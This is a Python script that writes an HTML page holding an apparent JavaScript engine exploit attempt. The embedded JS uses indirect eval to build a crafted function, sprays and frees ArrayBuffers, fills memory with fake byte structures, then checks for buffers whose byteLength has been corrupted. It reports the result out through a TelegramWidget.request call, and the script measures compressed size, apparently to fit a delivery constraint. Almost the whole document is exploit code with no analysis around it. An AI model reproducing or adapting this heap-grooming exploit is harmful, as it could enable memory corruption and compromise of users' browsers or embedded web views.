import pathlib, zlib
N, B, NT = 1400, 2560, 1200
JS = '''function mkf() {
  var wa = 1, wb = 2, wc = 3;
  return (0, eval)('"use strict"; globalThis.f = function ([] = eval("[]")) { var q1 = wa, q2 = 0, q3 = 0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; };');
}
var NT = @@NT@@, N = @@N@@, B = @@B@@, OFF = 0, QQ = 1;
var P = new Array(N);
for (var i = 0; i < N; i++) P[i] = new ArrayBuffer(B);
for (var i = 0; i < N; i++) P[i] = null;
mkf();
var A = new Array(N), UV = new Array(N);
for (var i = 0; i < N; i++) A[i] = new ArrayBuffer(B);
for (var i = 0; i < N; i++) UV[i] = new Uint8Array(A[i]);
var T = new Array(NT);
for (var i = 0; i < NT; i++) T[i] = new ArrayBuffer(64);
for (var h = 0; h < NT; h += 2) T[h] = null;
var PB = new Uint8Array(B);
var RT = [4,0,0,0, 5,0,0,0, 4,0,0,0, 4,0,0,0, 4,0,0,0];
var RJ = [4,0,0,0, 5,0,0,0, 255,255,0,0, 4,0,0,0, 4,0,0,0];
for (var o = OFF; o + 40 <= B; o += 40) { for (var k = 0; k < 20; k++) { PB[o+k] = (QQ ? RJ[k] : RT[k]); PB[o+20+k] = (QQ ? RT[k] : RJ[k]); } }
for (var i = 0; i < N; i++) UV[i].set(PB);
var out = "none";
try { f(); } catch (e) { out = "threw"; }
for (var i = 0; i < T.length; i++) { if (T[i] !== null && T[i].byteLength !== 64) { out = i + ":" + T[i].byteLength; break; } }
try { if (typeof TelegramWidget !== "undefined" && TelegramWidget.request) { var p = TelegramWidget.request(("L38 " + out).slice(0, 60)); if (p && p.then) p.then(function(){}, function(){}); } } catch (e) {}
("L38 " + out);
'''
for k, v in (("@@NT@@", NT), ("@@N@@", N), ("@@B@@", B)):
    JS = JS.replace(k, str(v))
html = '<!doctype html><meta charset="utf-8"><div id="v">loading</div><script>' + JS + '</script>'
pathlib.Path('out/attempt.html').write_text(html)
print("raw", len(html.encode()), "zlib9", len(zlib.compress(html.encode(), 9)))
